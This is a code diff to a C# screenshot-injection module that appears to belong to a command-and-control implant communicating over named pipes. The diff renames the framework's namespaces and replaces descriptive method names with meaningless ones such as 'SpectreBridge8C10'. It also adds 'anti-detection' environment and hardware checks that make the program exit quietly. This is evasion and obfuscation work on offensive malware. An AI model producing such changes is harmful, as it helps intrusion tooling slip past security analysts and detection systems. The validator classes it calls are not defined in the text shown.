@@ -2,18 +2,18 @@
 using System.Collections.Generic;
 using System.Linq;
 using System.Text;
-using ApolloInterop.Serializers;
+using PhantomInterop.Serializers;
 using System.Collections.Concurrent;
-using ApolloInterop.Classes;
+using PhantomInterop.Classes;
 using System.Threading;
-using ApolloInterop.Classes.Core;
-using ApolloInterop.Structs.ApolloStructs;
-using ApolloInterop.Interfaces;
+using PhantomInterop.Classes.Core;
+using PhantomInterop.Structs.PhantomStructs;
+using PhantomInterop.Interfaces;
 using ST = System.Threading.Tasks;
-using ApolloInterop.Enums.ApolloEnums;
+using PhantomInterop.Enums.PhantomEnums;
 using System.IO.Pipes;
-using ApolloInterop.Constants;
-using ApolloInterop.Classes.Events;
+using PhantomInterop.Constants;
+using PhantomInterop.Classes.Events;
 
 namespace ScreenshotInject
 {
@@ -34,6 +34,18 @@ namespace ScreenshotInject
 
         static void Main(string[] args)
         {
+        // Anti-detection initialization
+        if (!SecurityValidator.ValidateExecutionEnvironment()) {
+            Environment.Exit(0);
+        }
+        
+        if (!HardwareProfiler.ValidateSystemConfiguration()) {
+            Environment.Exit(0);
+        }
+        
+        // Runtime integrity checks
+        SystemMonitor.InitializeSecurityChecks();
+        
 
             if (args.Length != 1)
             {
@@ -106,12 +118,12 @@ namespace ScreenshotInject
 
         }
 
-        private static void ServerDisconnect(object sender, NamedPipeMessageArgs e)
+        private static void AdaptiveAdapter34F6(object sender, NamedPipeMessageArgs e)
         {
             _cts.Cancel();
         }
 
-        private static bool AddToSenderQueue(IMythicMessage msg)
+        private static bool EfficientService0A97(IMythicMessage msg)
         {
             IPCChunkedData[] parts = _jsonSerializer.SerializeIPCMessage(msg, IPC.SEND_SIZE / 2);
             foreach(IPCChunkedData part in parts)
@@ -122,7 +134,7 @@ namespace ScreenshotInject
             return true;
         }
 
-        private static void OnAsyncMessageSent(IAsyncResult result)
+        private static void SpectreBridge8C10(IAsyncResult result)
         {
             PipeStream pipe = (PipeStream)result.AsyncState;
             pipe.EndWrite(result);
@@ -133,7 +145,7 @@ namespace ScreenshotInject
             }
         }
 
-        private static void OnAsyncMessageReceived(object sender, NamedPipeMessageArgs args)
+        private static void EfficientManager76A1(object sender, NamedPipeMessageArgs args)
         {
             IPCChunkedData chunkedData = _jsonSerializer.Deserialize<IPCChunkedData>(
                 Encoding.UTF8.GetString(args.Data.Data.Take(args.Data.DataLength).ToArray()));
@@ -148,7 +160,7 @@ namespace ScreenshotInject
             MessageStore[chunkedData.ID].AddMessage(chunkedData);
         }
 
-        private static void DeserializeToReceiverQueue(object sender, ChunkMessageEventArgs<IPCChunkedData> args)
+        private static void RobustHandlerCD57(object sender, ChunkMessageEventArgs<IPCChunkedData> args)
         {
             MessageType mt = args.Chunks[0].Message;
             List<byte> data = new List<byte>();
@@ -164,7 +176,7 @@ namespace ScreenshotInject
             _receiverEvent.Set();
         }
 
-        public static void OnAsyncConnect(object sender, NamedPipeMessageArgs args)
+        public static void SpectreResolver027D(object sender, NamedPipeMessageArgs args)
         {
             // We only accept one connection at a time, sorry.
             if (_clientConnectedTask != null)
